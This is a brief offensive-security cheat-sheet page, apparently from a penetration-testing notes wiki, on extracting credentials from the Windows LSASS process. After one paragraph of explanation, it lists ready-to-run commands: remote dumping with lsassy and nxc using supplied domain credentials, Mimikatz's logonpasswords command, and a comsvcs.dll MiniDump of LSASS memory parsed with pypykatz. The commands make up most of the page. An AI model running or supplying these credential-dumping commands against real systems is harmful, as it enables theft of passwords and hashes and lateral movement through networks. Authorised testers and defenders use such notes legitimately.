# LSASS

The Local Security Authority Subsystem Service (`LSASS`) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. Those operations lead to the storage of credential material in the process memory

### Dumping secrets

{% tabs %}
{% tab title="Lsassy" %}
```sh
# Remotely extract credentials from LSASS memory. Also works with PtH and Kerberos auth
https://github.com/login-securite/lsassy 
lsassy -d <DOMAIN> -u <USER> -p <PASSWORD> <TARGET>

nxc smb <TARGET> -u <USER> -p <PASSWORD> -M lsassy
```
{% endtab %}

{% tab title="Mimikatz" %}
```sh
# Local dumping
sekurlsa::logonpasswords
```
{% endtab %}

{% tab title="Pypykatz" %}
```sh
# Exfiltrate and dump
Get-Process lsass   # Get the LSASS process PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full   # Dump memory
pypykatz lsa minidump <DMP_FILE>
```
{% endtab %}
{% endtabs %}
